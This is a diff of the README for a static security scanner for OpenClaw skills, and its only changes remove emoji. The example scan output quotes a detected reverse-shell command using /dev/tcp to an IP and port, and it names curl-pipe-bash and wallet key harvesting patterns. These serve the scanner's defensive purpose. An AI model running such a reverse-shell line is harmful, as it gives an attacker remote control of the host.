@@ -9,7 +9,7 @@ author: OpenClaw Security Team
 homepage: https://github.com/openclaw/skills/bomb-dog-sniff
 ---
 
-# bomb-dog-sniff v1.2.0 🐕
+# bomb-dog-sniff v1.2.0 
 
 **Like a bomb-sniffing dog for OpenClaw skills**
 
@@ -80,10 +80,10 @@ openclaw skill bomb-dog-sniff scan -j ./untrusted-skill > report.json
 
 **Output:**
 ```
-🔍 Bomb-Dog-Sniff Security Scanner v1.2.0
+ Bomb-Dog-Sniff Security Scanner v1.2.0
 Target: /home/user/skills/untrusted-skill
 
-🔴 CRITICAL (2)
+ CRITICAL (2)
 ──────────────────────────────────────────────────
   crypto_harvester: scripts/wallet.js:23
     Crypto wallet private key harvesting detected
@@ -95,7 +95,7 @@ Target: /home/user/skills/untrusted-skill
     Code: bash -i >& /dev/tcp/192.168.1.100/4444
     Confidence: high
 
-🟠 HIGH (1)
+ HIGH (1)
 ──────────────────────────────────────────────────
   pipe_bash: install.sh:12
     Dangerous curl | bash pattern detected
@@ -104,7 +104,7 @@ Target: /home/user/skills/untrusted-skill
 ═══════════════════════════════════════════════════
 SCAN SUMMARY
 ═══════════════════════════════════════════════════
-☠️ Risk Score: 75/100
+ Risk Score: 75/100
    Risk Level: MALICIOUS
    Duration: 125ms
    Files Scanned: 12/15
@@ -112,10 +112,10 @@ SCAN SUMMARY
    Findings: 3
 
    Severity Breakdown:
-     🔴 CRITICAL: 2
-     🟠 HIGH: 1
+      CRITICAL: 2
+      HIGH: 1
 
-📋 Recommendation:
+ Recommendation:
    MALICIOUS - Do not install. Found 3 critical security issues.
 
 Scan ID: bds-20260208-a1b2c3d4
@@ -216,10 +216,10 @@ bomb-dog-sniff scans for these threat categories:
 ## Risk Scoring
 
 ```
-0-19   SAFE        ✅ Install freely
-20-39  LOW         ⚠️  Review recommended
-40-69  SUSPICIOUS  🚫 Blocked by default
-70-100 MALICIOUS   ☠️  Never install
+0-19   SAFE         Install freely
+20-39  LOW           Review recommended
+40-69  SUSPICIOUS   Blocked by default
+70-100 MALICIOUS     Never install
 ```
 
 Each finding adds to the score:
@@ -400,13 +400,13 @@ To report false positives, please include:
 
 ## Security Notes
 
-⚠️ **Limitations:**
+ **Limitations:**
 - Static analysis only (some obfuscation may evade detection)
 - Pattern-based (novel attacks may not be detected)
 - Not a replacement for manual code review on critical systems
 - Cannot detect runtime-only malicious behavior
 
-✅ **Recommendations:**
+ **Recommendations:**
 - Use bomb-dog-sniff as first line of defense
 - Review code manually for high-security environments
 - Keep patterns.js updated with new threat signatures
@@ -448,4 +448,4 @@ MIT - See LICENSE file
 
 ---
 
-**Stay safe. Scan everything. Trust verified skills only.** 🦞🐕
+**Stay safe. Scan everything. Trust verified skills only.** 
